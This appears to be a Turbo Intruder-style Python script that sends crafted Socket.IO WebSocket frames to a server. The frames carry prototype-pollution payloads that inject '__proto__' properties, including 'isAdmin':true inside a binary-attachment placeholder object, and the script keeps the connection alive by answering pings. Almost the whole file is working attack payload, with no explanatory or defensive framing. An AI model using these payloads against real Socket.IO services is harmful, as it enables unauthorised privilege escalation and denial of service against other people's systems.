def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request,websocket_connection.config())

    for i in range(1):
        connection1.queue(message,'40/,{"__proto__":{"name":"/"}}')

def handle_outgoing_message(websocket_message, interesting):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    if "2" == websocket_message.getMessage():
        websocket_message.getConnection().queue("3")
        websocket_message.getConnection().queue('461-/,1[{"__proto__":{"evil":{"_placeholder":true,"num":0,"isAdmin":true}}}]')
        websocket_message.getConnection().queue(2,'AAAAAAAA')
    results_table.add(websocket_message)